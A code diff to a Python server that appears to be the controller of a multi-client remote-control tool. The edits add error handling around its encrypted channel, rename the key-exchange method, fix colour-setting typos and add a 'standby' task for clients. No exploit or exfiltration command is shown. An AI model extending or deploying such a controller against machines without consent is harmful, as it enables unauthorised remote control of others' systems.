@@ -142,7 +142,7 @@ class ServerThread(threading.Thread):
         self._prompt_color  = colorama.Fore.RESET
         self._prompt_style  = colorama.Style.BRIGHT
         self.name           = time.time()
-        self.db['session_key'] = self.diffiehellman()
+        self.db['session_key'] = self._diffiehellman()
         self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('localhost', port)) if globals().get('__DEBUG__') else self.s.bind(('0.0.0.0', port))
@@ -265,25 +265,31 @@ class ServerThread(threading.Thread):
         return ''.join(result).rstrip(b'\0')
     
     def _encrypt_aes(self, plaintext, key):
-        text        = self._pad(plaintext, AES.block_size)
-        iv          = os.urandom(AES.block_size)
-        cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
-        ciphertext  = iv + cipher.encrypt(text)
-        hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
-        output      = base64.b64encode(ciphertext + hmac_sha256)
-        return output
-
+        try:
+            text        = self._pad(plaintext, AES.block_size)
+            iv          = os.urandom(AES.block_size)
+            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
+            ciphertext  = iv + cipher.encrypt(text)
+            hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
+            output      = base64.b64encode(ciphertext + hmac_sha256)
+            return output
+        except Exception as e:
+            return self._error(str(e))
+            
     def _decrypt_aes(self, ciphertext, key):
-        ciphertext  = base64.b64decode(ciphertext.rstrip())
-        iv          = ciphertext[:AES.block_size]
-        cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
-        read_hmac   = ciphertext[-SHA256.digest_size:]
-        calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
-        output      = cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(b'\0')
-        self._error("HMAC-SHA256 hash authentication check failed - transmission may have been compromised\nExpected: '{}'\nReceived: '{}'".format(calc_hmac, read_hmac)) if calc_hmac != read_hmac else None
-        return output
+        try:
+            ciphertext  = base64.b64decode(ciphertext.rstrip())
+            iv          = ciphertext[:AES.block_size]
+            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
+            read_hmac   = ciphertext[-SHA256.digest_size:]
+            calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
+            output      = cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(b'\0')
+            self._error("HMAC-SHA256 hash authentication check failed - transmission may have been compromised\nExpected: '{}'\nReceived: '{}'".format(calc_hmac, read_hmac)) if calc_hmac != read_hmac else None
+            return output
+        except Exception as e:
+            return self._error(str(e))
     
-    def diffiehellman(self):
+    def _diffiehellman(self):
         try:
             g  = 2
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
@@ -294,7 +300,7 @@ class ServerThread(threading.Thread):
             x  = pow(xB, a, p)
             return self._obfuscate(SHA256.new(bytes(x).strip('L')).hexdigest())
         except Exception as e:
-            self._error("Diffie-Hellman transactionless key-agreement failed with error: {}\nretrying...".format(str(e)))
+            return self._error("{} returned error: {}".format(self._diffiehellman.func_name, str(e)))
 
     def encrypt(self, data, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
@@ -453,16 +459,16 @@ class ServerThread(threading.Thread):
         self._return()
           
     def quit_server(self):
+        self.shell.clear()
         for client in self.get_clients():
             try:
+                client.shell.set()
                 self.send_client('standby', client.name)
             except Exception as e:
                 print(str(e))
         sys.exit()
 
     def display_settings(self, args=None):
-        lock = self.lock if not self.current_client else self.current_client.lock
-        lock.acquire()
         if not args:
             print(colorama.Fore.RESET + colorama.Style.BRIGHT + '\n\n\t\tSettings')
             print(self._text_color + self._text_style + '\tdefault text color + style')
@@ -478,12 +484,12 @@ class ServerThread(threading.Thread):
                     if not hasattr(colorama.Fore, option):
                         print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                     self._prompt_color = getattr(colorama.Fore, option)
-                    print(colorama.Fore.RESET + Colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
+                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
                         self._print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                     self._prompt_style = getattr(colorama.Style, option)
-                    print(colorama.Fore.RESET + Colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
+                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
                 else:
                     print("usage: settings prompt <option> [value]")
             elif target == 'text':
@@ -491,15 +497,14 @@ class ServerThread(threading.Thread):
                     if not hasattr(colorama.Fore, option):
                         self._print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                     self._text_color = getattr(colorama.Fore, option)
-                    print(colorama.Fore.RESET + Colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)                    
+                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)                    
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
                         self._print("usage: settings text style [value]\nstyles:     bright/normal/dim")
                     self._text_style = getattr(colorama.Style, option)
-                    print(colorama.Fore.RESET + Colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
+                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
                 else:
                     print("usage: settings text <option> [value]")
-        lock.release()
         self._return()
 
     def show_usage_help(self, data=None):
@@ -844,7 +849,9 @@ class ClientHandler(threading.Thread):
                             result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
                             if result:
                                 threads['server']._print(result)
+                                self.shell.clear()
                                 threads['server'].save_task_results(task)
+                                self.shell.set()
                             continue
                         else:
                             threads['server'].send_client(command, self.name)
@@ -852,6 +859,9 @@ class ClientHandler(threading.Thread):
                         self.shell.clear()
                         threads['server'].show_usage_help(data=task.get('data'))
                         self.shell.set()
+                    elif 'standby' in task.get('task'):
+                        print(task.get('data'))
+                        break
                     else:
                         if task.get('data'):
                             threads['server']._print(task['data'])
